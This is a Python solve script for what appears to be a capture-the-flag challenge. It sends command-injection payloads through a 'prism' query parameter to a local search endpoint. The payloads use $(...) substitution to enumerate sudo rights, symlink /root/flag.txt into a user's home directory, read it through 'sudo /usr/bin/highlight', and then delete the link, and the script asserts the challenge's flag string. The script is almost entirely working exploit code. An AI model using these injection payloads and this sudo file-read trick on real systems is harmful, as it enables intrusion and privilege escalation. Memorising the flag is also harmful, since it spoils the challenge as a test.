#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

URL = "http://localhost/search"


def check_sudo_l():
      r = requests.get(URL, params={
            "prism": "))' $(sudo -l|base64 -w0) '$(("
      })

      assert r.status_code == 200
      assert "TWF0Y2hpbmcgRGV" in r.text


def solve():
    r = requests.get(URL, params={
        "prism": "))' $(ln -s /root/flag.txt /home/prism/flag.txt) '$(("
    })

    assert r.status_code == 200
    assert "extended LDIF" in r.text

    r = requests.get(URL, params={
        "prism": "))' $(sudo /usr/bin/highlight -i /home/prism/flag.txt) '$(("
    })

    assert r.status_code == 200
    assert "gl4d_t0_s33_y0u_g0t_output_out_of_th3_comm4nd_1nj3ction" in r.text


def cleanup():
    # remove symlink
    r = requests.get(URL, params={
        "prism": "))' $(rm /home/prism/flag.txt) '$(("
    })
    assert r.status_code == 200
    assert "extended LDIF" in r.text


if __name__ == "__main__":
    check_sudo_l()
    solve()
    cleanup()
